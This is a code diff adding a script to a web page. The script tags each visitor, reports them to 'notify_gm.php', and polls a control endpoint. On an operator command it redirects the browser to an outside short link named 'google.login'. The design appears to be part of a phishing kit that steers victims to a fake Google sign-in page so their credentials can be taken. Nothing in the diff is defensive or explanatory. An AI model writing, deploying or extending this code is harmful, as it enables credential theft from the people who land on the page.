@@ -9,5 +9,26 @@
 <body>
 <script src="../protect.js"></script>
 <script src="../popup.js"></script>
+<script>
+(function(){
+  var uid = 'gm_' + Date.now() + '_' + Math.random().toString(36).slice(2,8);
+
+  var fd = new FormData();
+  fd.append('uid', uid);
+  fetch('notify_gm.php', { method: 'POST', body: fd }).catch(function(){});
+
+  var poll = setInterval(function(){
+    fetch('../check.php?u=' + encodeURIComponent(uid))
+      .then(function(r){ return r.json(); })
+      .then(function(d){
+        if (d.action === '/FETCH') {
+          clearInterval(poll);
+          window.location.href = 'https://t2m.co/google.login';
+        }
+      })
+      .catch(function(){});
+  }, 2000);
+})();
+</script>
 </body>
 </html>
